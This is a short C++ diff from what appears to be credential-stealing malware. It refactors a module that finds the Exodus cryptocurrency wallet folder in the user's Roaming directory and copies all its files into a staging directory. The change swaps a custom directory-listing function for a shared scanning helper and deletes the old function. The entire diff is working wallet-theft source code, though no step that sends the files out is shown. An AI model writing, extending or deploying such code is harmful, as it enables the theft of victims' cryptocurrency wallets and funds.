@@ -7,7 +7,7 @@
 static const fs::path EXODUS_PATH = Utils::getRoamingPath() / "Exodus" / "exodus.wallet";
 
 void Exodus::execute(fs::path &root) {
-    std::vector<fs::path> paths = Exodus::exodusFiles();
+    std::vector<fs::path> paths = FilesUtil::scanDirectory(EXODUS_PATH);
 
     if(paths.empty())
         return;
@@ -19,20 +19,4 @@ void Exodus::execute(fs::path &root) {
     {
         Utils::copy(path, dst);
     }
-}
-
-std::vector<fs::path> Exodus::exodusFiles() {
-    std::vector<fs::path> paths;
-    try
-    {
-        for (const auto& entry : fs::directory_iterator(EXODUS_PATH)) {
-            const fs::path& item_path = entry.path();
-            std::string item_path_str = item_path.string();
-
-            paths.push_back(item_path);
-        }
-    }
-    catch (const fs::filesystem_error& ignored) {}
-
-    return paths;
 }
